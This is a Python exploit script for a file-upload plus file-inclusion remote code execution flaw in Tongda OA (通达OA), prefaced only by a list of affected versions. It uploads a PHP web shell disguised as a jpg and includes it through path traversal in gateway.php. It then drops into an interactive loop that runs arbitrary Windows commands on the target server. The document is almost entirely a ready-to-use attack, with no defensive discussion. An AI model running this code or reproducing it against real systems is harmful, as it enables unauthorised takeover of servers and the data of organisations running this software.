#2020/03/13 通达OA论坛发布紧急通知

#影响范围：
#V11版
#2017版
#2016版
#2015版
#2013增强版
#2013版


#!/usr/bin/env python3
# -*- encoding: utf-8 -*-
# oa通达文件上传加文件包含远程代码执行

import requests
import re
import sys

def oa(url):
    upurl = url + '/ispirit/im/upload.php'
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.9 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Language": "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3", "Accept-Encoding": "gzip, deflate", "Connection": "close", "Upgrade-Insecure-Requests": "1", "Content-Type": "multipart/form-data; boundary=---------------------------27723940316706158781839860668"}
    data = "-----------------------------27723940316706158781839860668\r\nContent-Disposition: form-data; name=\"ATTACHMENT\"; filename=\"jpg\"\r\nContent-Type: image/jpeg\r\n\r\n<?php\r\n$command=$_POST['cmd'];\r\n$wsh = new COM('WScript.shell');\r\n$exec = $wsh->exec(\"cmd /c \".$command);\r\n$stdout = $exec->StdOut();\r\n$stroutput = $stdout->ReadAll();\r\necho $stroutput;\r\n?>\n\r\n-----------------------------27723940316706158781839860668\r\nContent-Disposition: form-data; name=\"P\"\r\n\r\n1\r\n-----------------------------27723940316706158781839860668\r\nContent-Disposition: form-data; name=\"DEST_UID\"\r\n\r\n1222222\r\n-----------------------------27723940316706158781839860668\r\nContent-Disposition: form-data; name=\"UPLOAD_MODE\"\r\n\r\n1\r\n-----------------------------27723940316706158781839860668--\r\n"
    req = requests.post(url=upurl, headers=headers, data=data)
    filename = "".join(re.findall("2003_(.+?)\|",req.text))
    in_url = url + '/ispirit/interface/gateway.php'
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.9 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Language": "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3", "Accept-Encoding": "gzip, deflate", "X-Forwarded-For": "127.0.0.1", "Connection": "close", "Upgrade-Insecure-Requests": "1", "Content-Type": "application/x-www-form-urlencoded"}
    data = "json={\"url\":\"../../../general/../attach/im/2003/%s.jpg\"}&cmd=%s" % (filename,"echo php00py")
    include_req = requests.post(url=in_url, headers=headers, data=data)
    if  'php00py' in include_req.text:
        print("[+] OA RCE vulnerability ")
        return filename
    else:
        print("[-] Not OA RCE vulnerability ")
        return False


def oa_rce(url, filename,command):
    url = url + '/ispirit/interface/gateway.php'
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.9 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Language": "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3", "Accept-Encoding": "gzip, deflate", "Connection": "close", "Upgrade-Insecure-Requests": "1", "Content-Type": "application/x-www-form-urlencoded"}
    data = "json={\"url\":\"../../../general/../attach/im/2003/%s.jpg\"}&cmd=%s" % (filename,command)
    req = requests.post(url, headers=headers, data=data)
    print(req.text)



if __name__ == '__main__':
        if len(sys.argv) < 2:
            print("please input your url python oa_rce.py http://127.0.0.1:8181")
        else:
            url = sys.argv[1]
            filename = oa(url)
            while filename:
                try:
                    command = input("wran@shelLhost#")
                
                    if command == "exit" or command == "quit":
                        break
                    else:
                        oa_rce(url,filename,command)
                except KeyboardInterrupt:
                    break 
